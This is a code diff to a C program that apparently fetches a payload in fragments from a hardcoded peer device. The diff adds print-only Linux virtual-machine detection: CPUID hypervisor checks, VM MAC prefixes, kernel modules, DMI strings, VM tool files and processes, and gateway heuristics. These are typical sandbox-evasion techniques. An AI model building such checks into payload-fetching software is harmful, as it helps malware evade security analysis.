@@ -1,3 +1,4 @@
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -6,13 +7,274 @@
 #include <netinet/in.h>
 #include <sys/socket.h>
 #include <ifaddrs.h>
+#include <sys/types.h>
+#include <dirent.h>
+#include <sys/stat.h>
+#include <errno.h>
+#include <ctype.h>
+#include <stdint.h>
+
+#include <cpuid.h> // for __get_cpuid
 
 #define BUFFER_SIZE 1024
 #define MAX_FRAGMENTS 1000
 #define PORT 8080
 #define DEVICE_B_IP "192.168.8.128"  // Hardcoded IP address for Device B
 
-// Function to get the local IP address
+/* ----------- Helper: case-insensitive substring ----------- */
+static char *strcasestr_safe(const char *hay, const char *needle) {
+    if (!hay || !needle) return NULL;
+    size_t nlen = strlen(needle);
+    if (nlen == 0) return (char*)hay;
+    for (; *hay; ++hay) {
+        if (tolower((unsigned char)*hay) == tolower((unsigned char)*needle)) {
+            if (strncasecmp(hay, needle, nlen) == 0) return (char*)hay;
+        }
+    }
+    return NULL;
+}
+
+/* ------------- VM detection (Linux-only) ------------- */
+
+/* CPUID checks: hypervisor bit and hypervisor vendor (leaf 0x40000000) */
+static void check_cpuid_virtualization_linux() {
+    printf("\n=== CPU / CPUID checks ===\n");
+    unsigned int eax, ebx, ecx, edx;
+    // leaf 1 => ECX bit 31 is hypervisor present
+    if (__get_cpuid(1, &eax, &ebx, &ecx, &edx)) {
+        int hypervisor_present = (ecx >> 31) & 1;
+        printf("Hypervisor present bit (CPUID.1:ECX[31]): %d\n", hypervisor_present);
+        int vmx = (ecx >> 5) & 1; // Intel VMX
+        printf("VMX (Intel VT-x) reported: %d\n", vmx);
+    } else {
+        printf("CPUID leaf 1 not available\n");
+    }
+    // leaf 0x40000000 => hypervisor vendor id string in EBX, ECX, EDX
+    if (__get_cpuid(0x40000000, &eax, &ebx, &ecx, &edx)) {
+        char vendor[13];
+        memcpy(vendor + 0, &ebx, 4);
+        memcpy(vendor + 4, &ecx, 4);
+        memcpy(vendor + 8, &edx, 4);
+        vendor[12] = '\0';
+        printf("Hypervisor vendor id (CPUID 0x40000000): %s\n", vendor);
+        const char *known[] = { "KVMKVMKVM", "Microsoft Hv", "VMwareVMware", "VBoxVBoxVBox", "XenVMMXenVMM", NULL };
+        for (int i = 0; known[i]; ++i) {
+            if (strcasestr_safe(vendor, known[i])) {
+                printf("  -> Matches known hypervisor vendor substring: %s\n", known[i]);
+            }
+        }
+    } else {
+        printf("CPUID leaf 0x40000000 not available (no hypervisor vendor id available)\n");
+    }
+
+    /* As a fallback also inspect /proc/cpuinfo for hypervisor keyword */
+    FILE *f = fopen("/proc/cpuinfo", "r");
+    if (f) {
+        char line[512];
+        int found = 0;
+        while (fgets(line, sizeof(line), f)) {
+            if (strcasestr_safe(line, "hypervisor")) found = 1;
+        }
+        fclose(f);
+        printf("/proc/cpuinfo contains 'hypervisor' keyword: %s\n", found ? "YES" : "NO");
+    }
+}
+
+/* MAC prefix checks: read /sys/class/net/ */
+static void check_mac_prefixes_linux() {
+    printf("\n=== MAC prefix & network adapter checks ===\n");
+    const char *vm_prefixes[] = { "00:05:69", "00:0C:29", "00:50:56", "08:00:27", "00:1C:42", NULL };
+    DIR *d = opendir("/sys/class/net");
+    if (!d) {
+        perror("opendir /sys/class/net");
+        return;
+    }
+    struct dirent *ent;
+    while ((ent = readdir(d)) != NULL) {
+        if (ent->d_name[0] == '.') continue;
+        char path[512];
+        snprintf(path, sizeof(path), "/sys/class/net/%s/address", ent->d_name);
+        FILE *fa = fopen(path, "r");
+        if (!fa) continue;
+        char mac[128];
+        if (fgets(mac, sizeof(mac), fa)) {
+            char *nl = strchr(mac, '\n'); if (nl) *nl = 0;
+            printf("Interface: %s, MAC: %s\n", ent->d_name, mac);
+            for (int i = 0; vm_prefixes[i]; ++i) {
+                if (strncasecmp(mac, vm_prefixes[i], strlen(vm_prefixes[i])) == 0) {
+                    printf("  -> MAC prefix matches VM vendor: %s\n", vm_prefixes[i]);
+                }
+            }
+        }
+        fclose(fa);
+    }
+    closedir(d);
+}
+
+/* Kernel module check: read /proc/modules */
+static void check_kernel_modules_linux() {
+    printf("\n=== Kernel modules / drivers check ===\n");
+    FILE *f = fopen("/proc/modules", "r");
+    if (!f) {
+        perror("fopen /proc/modules");
+        return;
+    }
+    char buf[512];
+    int found_vm_module = 0;
+    const char *modnames[] = { "vboxguest", "vboxsf", "vboxvideo", "vmhgfs", "vmw_balloon", "kvm", "virtio", "vboxguest", "vboxdrv", NULL };
+    while (fgets(buf, sizeof(buf), f)) {
+        for (int i = 0; modnames[i]; ++i) {
+            if (strcasestr_safe(buf, modnames[i])) {
+                printf("Found kernel module related to VM: %s", buf);
+                found_vm_module = 1;
+            }
+        }
+    }
+    fclose(f);
+    if (!found_vm_module) printf("No obvious VM kernel module names found in /proc/modules\n");
+}
+
+/* DMI / BIOS checks via /sys/class/dmi/id */
+static void check_dmi_and_disk_linux() {
+    printf("\n=== DMI / BIOS / Disk checks ===\n");
+    const char *dmi_files[] = {
+        "/sys/class/dmi/id/product_name",
+        "/sys/class/dmi/id/product_version",
+        "/sys/class/dmi/id/sys_vendor",
+        "/sys/class/dmi/id/board_name",
+        "/sys/class/dmi/id/board_vendor",
+        NULL
+    };
+    for (int i = 0; dmi_files[i]; ++i) {
+        FILE *f = fopen(dmi_files[i], "r");
+        if (!f) continue;
+        char line[256];
+        if (fgets(line, sizeof(line), f)) {
+            char *nl = strchr(line, '\n'); if (nl) *nl = 0;
+            printf("%s: %s\n", dmi_files[i], line);
+            if (strcasestr_safe(line, "vbox") || strcasestr_safe(line, "virtual") ||
+                strcasestr_safe(line, "vmware") || strcasestr_safe(line, "qemu") ||
+                strcasestr_safe(line, "kvm") ) {
+                printf("  -> DMI string implies virtualization\n");
+            }
+        }
+        fclose(f);
+    }
+
+    // Disk model checks via /sys/block/device/model
+    DIR *b = opendir("/sys/block");
+    if (!b) return;
+    struct dirent *e;
+    while ((e = readdir(b)) != NULL) {
+        if (e->d_name[0] == '.') continue;
+        char modelpath[512];
+        snprintf(modelpath, sizeof(modelpath), "/sys/block/%s/device/model", e->d_name);
+        FILE *fm = fopen(modelpath, "r");
+        if (!fm) continue;
+        char model[256];
+        if (fgets(model, sizeof(model), fm)) {
+            char *nl = strchr(model, '\n'); if (nl) *nl = 0;
+            printf("Block device %s model: %s\n", e->d_name, model);
+            if (strcasestr_safe(model, "vbox") || strcasestr_safe(model, "vmware") ||
+                strcasestr_safe(model, "virtual") || strcasestr_safe(model, "qemu")) {
+                printf("  -> Disk model implies virtual disk\n");
+            }
+        }
+        fclose(fm);
+    }
+    closedir(b);
+}
+
+/* Filesystem checks for common VM tools */
+static void check_filesystem_vmtools_linux() {
+    printf("\n=== Filesystem checks for VM tools ===\n");
+    const char *paths[] = {
+        "/usr/bin/vmtoolsd",
+        "/usr/sbin/VBoxService",
+        "/usr/bin/VBoxService",
+        "/usr/bin/qemu-ga",
+        "/usr/bin/virt-what",
+        NULL
+    };
+    for (int i = 0; paths[i]; ++i) {
+        if (access(paths[i], F_OK) == 0) {
+            printf("Found VM-related file: %s\n", paths[i]);
+        }
+    }
+}
+
+/* Process checks: scan /proc/ */
+static int is_process_running_posix(const char *name) {
+    DIR *d = opendir("/proc");
+    if (!d) return 0;
+    struct dirent *ent;
+    while ((ent = readdir(d)) != NULL) {
+        if (!isdigit((unsigned char)ent->d_name[0])) continue;
+        char cmdpath[512];
+        snprintf(cmdpath, sizeof(cmdpath), "/proc/%s/cmdline", ent->d_name);
+        FILE *f = fopen(cmdpath, "r");
+        if (!f) continue;
+        char cmd[512];
+        size_t r = fread(cmd, 1, sizeof(cmd)-1, f);
+        fclose(f);
+        if (r > 0) {
+            cmd[r] = '\0';
+            // cmdline is NUL-separated; treat as string
+            if (strcasestr_safe(cmd, name)) { closedir(d); return 1; }
+        }
+    }
+    closedir(d);
+    return 0;
+}
+
+static void check_processes_linux() {
+    printf("\n=== Process checks ===\n");
+    const char *procs[] = { "vmtoolsd", "VBoxService", "VBoxClient", "vboxadd", "qemu-ga", "virtlogd", "virtlogd-qemu", "vboxtray", NULL };
+    for (int i = 0; procs[i]; ++i) {
+        printf("Process %s running: %s\n", procs[i], is_process_running_posix(procs[i]) ? "YES" : "NO");
+    }
+}
+
+/* Network gateway & hostname heuristics */
+static void check_network_and_hostname_linux() {
+    printf("\n=== Network & hostname checks ===\n");
+    char hostname[256];
+    if (gethostname(hostname, sizeof(hostname)) == 0) {
+        printf("Hostname: %s\n", hostname);
+        if (strcasestr_safe(hostname, "vm") || strcasestr_safe(hostname, "vbox") ||
+            strcasestr_safe(hostname, "virtual") || strcasestr_safe(hostname, "qemu")) {
+            printf("  -> Hostname suggests VM\n");
+        }
+    }
+    // Default gateway heuristic (look for 10.0.2.2)
+    FILE *p = popen("ip route 2>/dev/null | grep default | awk '{print $3}'", "r");
+    if (p) {
+        char gw[128];
+        if (fgets(gw, sizeof(gw), p)) {
+            char *nl = strchr(gw, '\n'); if (nl) *nl = 0;
+            printf("Default gateway: %s\n", gw);
+            if (strcmp(gw, "10.0.2.2") == 0) {
+                printf("  -> Gateway 10.0.2.2 suggests VirtualBox/Android emulator NAT\n");
+            }
+        }
+        pclose(p);
+    }
+}
+
+/* Run all Linux-compatible VM checks and print findings */
+static void run_all_vm_checks_linux() {
+    check_cpuid_virtualization_linux();
+    check_mac_prefixes_linux();
+    check_kernel_modules_linux();
+    check_dmi_and_disk_linux();
+    check_filesystem_vmtools_linux();
+    check_processes_linux();
+    check_network_and_hostname_linux();
+}
+
+/* ------------------- Original networking code (kept as-is) ------------------- */
+
+/* Function to get the local IP address */
 char* get_local_ip() {
     struct ifaddrs *ifaddr, *ifa;
     static char ip[INET_ADDRSTRLEN];
@@ -42,8 +304,12 @@ char* get_local_ip() {
     return "127.0.0.1"; // Return loopback if no other interface found
 }
 
-// Function to request payload from Device B and receive fragments
+/* Function to request payload from Device B and receive fragments */
 int main() {
+    /* ---------- RUN VM DETECTION FIRST (print-only) ---------- */
+    run_all_vm_checks_linux(); // detection prints results but DOES NOT exit
+
+    /* ---------- Then proceed with original networking logic ---------- */
     int sock, server_sock, client_sock;
     struct sockaddr_in server_addr, client_addr, listen_addr;
     socklen_t addr_len = sizeof(struct sockaddr_in);
@@ -61,7 +327,7 @@ int main() {
         fprintf(stderr, "Failed to get local IP address\n");
         return 1;
     }
-    printf("Device A IP: %s\n", local_ip);
+    printf("\nDevice A IP: %s\n", local_ip);
     
     printf("Using Device B IP address: %s\n", DEVICE_B_IP);
     
